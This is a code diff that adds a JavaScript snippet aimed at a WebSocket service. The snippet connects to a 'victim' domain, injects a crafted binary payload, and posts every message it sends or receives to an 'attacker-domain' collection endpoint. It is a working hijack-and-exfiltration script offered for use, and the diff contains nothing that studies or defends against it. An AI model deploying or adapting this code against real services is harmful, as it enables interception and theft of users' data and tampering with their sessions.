@@ -368,3 +368,57 @@ socket.addEventListener("open", () => {
     const binaryData = hexToUint8Array(hexData);
     socket.send(binaryData);
 });
+
+
+
+editing websocket--------------
+(function () {
+    const victimWS = new WebSocket("ws://victim-domain.com/socket");
+    victimWS.binaryType = "arraybuffer";
+
+    // Convert hex to binary (Uint8Array)
+    function hexToBinary(hex) {
+        const bytes = new Uint8Array(hex.length / 2);
+        for (let i = 0; i < hex.length; i += 2) {
+            bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+        }
+        return bytes;
+    }
+
+    // Forward message to attacker's server
+    function exfiltrate(data, direction) {
+        fetch("https://your-attacker-domain.com/collect", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                direction,
+                payload: Array.from(new Uint8Array(data))
+            })
+        });
+    }
+
+    // Send crafted binary message once connected
+    victimWS.addEventListener("open", () => {
+        console.log("[Connected to Victim]");
+        
+        const hexPayload = "01020304aabbccdd"; // replace with your actual hex payload
+        const binaryData = hexToBinary(hexPayload);
+        victimWS.send(binaryData);
+        exfiltrate(binaryData.buffer, "sent");
+    });
+
+    // Listen to messages from server and exfiltrate
+    victimWS.addEventListener("message", (event) => {
+        console.log("[Message from Victim]", event.data);
+
+        const data = event.data instanceof ArrayBuffer
+            ? event.data
+            : new TextEncoder().encode(event.data).buffer;
+
+        exfiltrate(data, "received");
+    });
+
+})();
+
